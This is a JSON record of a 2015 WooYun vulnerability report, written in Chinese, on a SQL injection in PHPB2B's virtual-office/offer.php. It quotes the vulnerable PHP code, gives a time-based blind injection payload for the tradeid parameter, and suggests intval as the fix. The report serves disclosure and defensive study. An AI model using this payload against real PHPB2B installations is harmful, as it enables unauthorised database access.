{"id": 38385, "wybug_id": "wooyun-2015-096439", "wybug_title": "PHPB2B最新版Update注入", "wybug_corp": "phpb2b.com", "wybug_author": "error", "wybug_date": "2015-02-16 13:19", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： RT 详细说明：  \n注入链接：/virtual-office/offer.php注入参数：tradeid漏洞代码：（第346行开始）if(isset($_POST['refresh'])){\tif (!empty($_POST['refresh']) && !empty($_POST['tradeid'])) {\t\t$vals = array();\t\t$pre_submittime = $pdb->GetOne(\"select max(submit_time) from {$tb_prefix}trades where member_id=\".$the_memberid);\t\tif ($pre_submittime>($time_stamp-$tMaxDay*86400)) {\t\t\tflash(\"allow_refresh_day\");\t\t}\t\t$vals['submit_time'] = $time_stamp;\t\t$vals['expire_days'] = 10;\t\t$vals['expire_time'] = $time_stamp+(24*3600*$vals['expire_days']);\t\t$conditions[]= \"status='1'\";\t\t$ids = implode(\",\", $_POST['tradeid']);\t\t$conditions[]= \"id in (\".$ids.\")\";\t\t$condition = implode(\" AND \", $conditions);\t\t$sql = \"update \".$trade->getTable().\" set submit_time=\".$time_stamp.\",expire_days=10,expire_time=\".$vals['expire_time'].\" where \".$condition;\t\t$result = $pdb->Execute($sql);\t}}$ids = implode(\",\", $_POST['tradeid']);从前台获取post数组参数tradeid后直接使用implode函数分割后直接拼接sql语句导致Update注入漏洞。\n   漏洞证明：  \n漏洞测试：http://127.0.0.1/phpb2b/virtual-office/offer.phpPost:refresh=1&tradeid[]=1111)||if((length(user())=0),1,sleep(5))#这里为了测试把注入的sql语句打印出来\n\nMysql日志：\n\n\n\n成功执行延时注入\n   修复方案：  intval   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}